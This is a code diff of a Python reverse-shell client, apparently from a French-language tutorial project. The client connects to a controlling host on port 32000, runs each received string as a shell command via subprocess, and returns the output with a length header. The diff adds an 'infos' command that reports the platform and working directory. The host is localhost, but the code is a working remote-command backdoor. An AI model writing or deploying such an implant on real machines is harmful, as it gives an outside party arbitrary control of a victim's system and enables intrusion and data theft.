@@ -2,6 +2,8 @@
 import socket
 import time
 import subprocess
+import platform
+import os
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -26,20 +28,16 @@ while True:
         break
     commande = commande_data.decode()
     print("Commande : ", commande)
-    resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
-    reponse = resultat.stdout + resultat.stderr
 
-    if not reponse or len(reponse) == 0:
-        reponse = " "
+    if commande == "infos":
+        reponse = platform.platform() + " " + os.getcwd()
+    else:
+        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
+        reponse = resultat.stdout + resultat.stderr
 
-    # HEADER 13 octets -> longeur data
-    # DATA (longeur) octets
+        if not reponse or len(reponse) == 0:
+            reponse = " "
 
-    # HEADER 0000000003173
-    # DATA 3173 octets
-
-    # 1000000000000   13 octets
-    
     header = str(len(reponse.encode())).zfill(13)
     print("header:", header)
     s.sendall(header.encode())
